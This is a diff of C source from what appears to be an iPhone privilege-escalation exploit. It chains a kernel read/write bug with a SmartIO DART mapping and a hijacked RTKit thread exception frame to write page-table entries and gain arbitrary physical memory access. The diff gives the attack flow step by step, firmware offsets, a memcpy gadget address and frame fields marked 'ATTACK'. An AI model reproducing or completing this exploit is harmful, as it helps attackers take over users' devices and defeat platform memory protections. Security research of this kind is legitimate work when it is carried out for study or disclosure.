@@ -16,12 +16,15 @@
  * Prerequisites: kernel R/W from IOSurface race (CVE-2026-112477)
  *
  * Flow:
- * 1. Locate SmartIO DART (IOMMU) base and carveout region
- * 2. Find a sleeping RTKit thread's saved register frame
- * 3. Arm the frame: set PC to memcpy gadget, args to target page-table page
- * 4. Wake the thread — RTKit scheduler restores frame, executes memcpy
- * 5. memcpy writes controlled bytes into AP page-table page
- * 6. Create self-referencing PTE for arbitrary physical memory access
+ * 1. Locate SmartIO DART (IOMMU) base and carveout region via IORegistry
+ * 2. Create DART mapping: SmartIO IOvirt addr → AP page-table physical page
+ *    (DART PTEs have no parity checking on 27.0.1, patched in 27.2b3)
+ * 3. Find a sleeping RTKit thread's exception frame on the stack
+ *    (thread struct +0x48 → frame ptr, frame is 0x350 bytes on stack)
+ * 4. Arm the frame: set ELR_EL1 to _memcpy (0x87c8), set x0/x1/x2 for copy
+ * 5. Wake the thread — RTKit scheduler restores frame via eret → memcpy runs
+ * 6. memcpy writes controlled PTE bytes through DART → AP page-table page
+ * 7. Self-referencing PTE enables arbitrary physical R/W from userspace
  *
  * References:
  * - silentIO (ddddddedcds): SmartIO SPTM bypass for iPhone 16 Pro / iOS 18.6.2
@@ -75,31 +78,82 @@ static uint64_t smartio_carveout_size = 0;
  * When an RTKit thread sleeps, the scheduler saves its register state.
  * The frame includes: x0-x30, sp, pc, cpsr (at minimum).
  *
- * RTKit_release-3514.0.15 thread context (from firmware disassembly):
+ * RTKit_release-3514.0.15 (from firmware disassembly, 2026-11-20):
  *
- * Thread struct: 0xB0 (176) bytes. Context pointer at thread+0x48.
- * Context struct: 0x348 (840) bytes.
+ * Thread struct: 0xB0 (176) bytes. Frame pointer at thread+0x48.
+ * Thread list at VA 0x113560. Current threads at VA 0x1cfe0.
  *
- * RTK_thread_create sets initial context:
- *   context+0x00: x0 (first argument / initial arg)
- *   context+0x08: PC (entry point / resume address)
- *   context+0xE8: magic 0x7777777777770077
+ * TWO context formats exist:
  *
- * For the silentIO technique, we target a sleeping thread's context:
- *   context+0x00: x0 → memcpy dst (DART-mapped AP page-table page)
- *   context+0x08: PC → memcpy gadget (0x87c8)
- *   context+0x10: x2 → memcpy len (8 bytes for one PTE)
- * Note: x1 (src) location needs runtime verification.
+ * A) INITIAL CONTEXT BUFFER — set by RTK_thread_create for new threads:
+ *   +0x00: x0 (first argument)
+ *   +0x08: PC (entry point)
+ *   +0xE8: magic 0x7777777777770077
+ *   +0xF8: SP (aligned stack)
+ *   +0x100: trampoline address (0xcfa4: br x1 → jumps to PC)
+ *   +0x108: EL value (4=EL1h or 8=EL2h)
+ *   +0x110: CPACR (0x300000)
+ *   Size: 0x348 bytes
  *
- * VERIFIED from disassembly 2026-11-20. Thread list at VA 0x113560.
+ * B) EXCEPTION FRAME — saved on stack when thread sleeps via svc/irq:
+ *   +0x000: x0, x1    ← ATTACK: x0=memcpy dst, x1=memcpy src
+ *   +0x010: x2, x3    ← ATTACK: x2=memcpy len
+ *   +0x020: x4, x5
+ *   +0x030: x6, x7
+ *   +0x040: x8, x9
+ *   +0x050: x10, x11
+ *   +0x060: x12, x13
+ *   +0x070: x14, x15
+ *   +0x080: x16, x17
+ *   +0x090: x18, x19
+ *   +0x0A0: x20, x21
+ *   +0x0B0: x22, x23
+ *   +0x0C0: x24, x25
+ *   +0x0D0: x26, x27
+ *   +0x0E0: x28, x29
+ *   +0x0F0: x30(LR), original_SP
+ *   +0x100: ELR_EL1, SPSR_EL1  ← ATTACK: ELR = memcpy (0x87c8)
+ *   +0x110: CPACR_EL1
+ *   +0x118: FPSR, FPCR
+ *   +0x128: q0-q31 (NEON, 512 bytes)
+ *   +0x328: FAR_EL1, PAR_EL1
+ *   +0x338: ESR_EL1 (32-bit)
+ *   Size: 0x350 bytes (SVC save uses 0x348, IRQ save uses 0x350)
+ *
+ *   Restore path 1 (eret at 0x7d68): full thread switch via tpidrro_el0
+ *   Restore path 2 (eret at 0x7ee4): return to same thread via SP
+ *
+ * Context switch mechanism: svc #0 (at 0xc778) → Sync exception →
+ *   VBAR(0x1000)+0x200 handler → save all regs to stack → scheduler →
+ *   pick next thread → restore regs from next thread's frame → eret
  */
+
+/* Exception frame offsets (format B — sleeping threads) */
+#define EXC_FRAME_X0        0x000
+#define EXC_FRAME_X1        0x008
+#define EXC_FRAME_X2        0x010
+#define EXC_FRAME_X3        0x018
+#define EXC_FRAME_LR        0x0F0  /* x30 */
+#define EXC_FRAME_ORIG_SP   0x0F8
+#define EXC_FRAME_ELR       0x100  /* return PC — the critical field */
+#define EXC_FRAME_SPSR      0x108
+#define EXC_FRAME_CPACR     0x110
+#define EXC_FRAME_SIZE_SVC  0x348
+#define EXC_FRAME_SIZE_IRQ  0x350
+
+/* Initial context offsets (format A — new threads) */
 #define RTK_CTX_X0_OFF      0x00
 #define RTK_CTX_PC_OFF      0x08
-#define RTK_CTX_X2_OFF      0x10
 #define RTK_CTX_MAGIC_OFF   0xE8
 #define RTK_CTX_MAGIC_VAL   0x7777777777770077ULL
+#define RTK_CTX_SP_OFF      0xF8
+#define RTK_CTX_TRAMPOLINE  0x100
+#define RTK_CTX_EL_OFF      0x108
+#define RTK_CTX_CPACR_OFF   0x110
 #define RTK_CTX_SIZE        0x348
-#define RTK_THREAD_CTX_PTR  0x48
+
+/* Thread struct */
+#define RTK_THREAD_FRAME_PTR 0x48
 #define RTK_THREAD_SIZE     0xB0
 
 /*
